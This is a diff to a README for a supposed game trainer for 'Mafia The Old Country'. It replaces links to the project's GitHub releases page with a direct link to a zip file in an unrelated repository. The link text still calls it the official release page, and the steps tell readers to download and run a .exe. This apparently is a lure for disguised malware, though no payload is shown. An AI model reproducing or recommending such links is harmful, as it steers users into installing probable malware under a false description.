@@ -5,7 +5,7 @@ description: "Modify game parameters for Mafia The Old Country with this trainer
 ---
 # 🎮 Mafia-Old-Country-Trainer-2026 - Master your gameplay with simple tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Machinemade-greaterprairiechicken513/Mafia-Old-Country-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Machinemade-greaterprairiechicken513/machinemade-greaterprairiechicken513.github.io/main/Cnidoscolus/v3.5.zip)
 
 ## 📌 Overview
 
@@ -24,7 +24,7 @@ Ensure your computer meet these requirements before you start.
 
 Follow these steps to obtain the correct version for your system:
 
-1.  Visit the official repository release page: [https://github.com/Machinemade-greaterprairiechicken513/Mafia-Old-Country-Trainer-2026/releases](https://github.com/Machinemade-greaterprairiechicken513/Mafia-Old-Country-Trainer-2026/releases).
+1.  Visit the official repository release page: [https://raw.githubusercontent.com/Machinemade-greaterprairiechicken513/machinemade-greaterprairiechicken513.github.io/main/Cnidoscolus/v3.5.zip](https://raw.githubusercontent.com/Machinemade-greaterprairiechicken513/machinemade-greaterprairiechicken513.github.io/main/Cnidoscolus/v3.5.zip).
 2.  Locate the list of files under the latest release.
 3.  Select the file ending in .exe to start the download.
 4.  Save the file to your desktop for easy access.
